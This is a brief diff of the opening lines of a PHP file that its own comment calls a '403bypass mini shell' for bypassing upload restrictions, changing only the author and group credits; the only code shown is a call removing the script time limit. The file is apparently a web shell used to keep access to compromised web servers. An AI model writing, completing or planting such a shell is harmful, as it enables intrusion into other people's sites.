@@ -1,7 +1,7 @@
 <?php
-/*	~ Mrj 403bypass mini shell
+/*	~ BONUMMASTWR 403bypass mini shell
 	~ V.10
-	~ Thanks to all mem AnonSec Team and all friend.
+	~ UNDERGROUND SECURITY.
 	~bypass 403 upload 
 */
 set_time_limit(0);
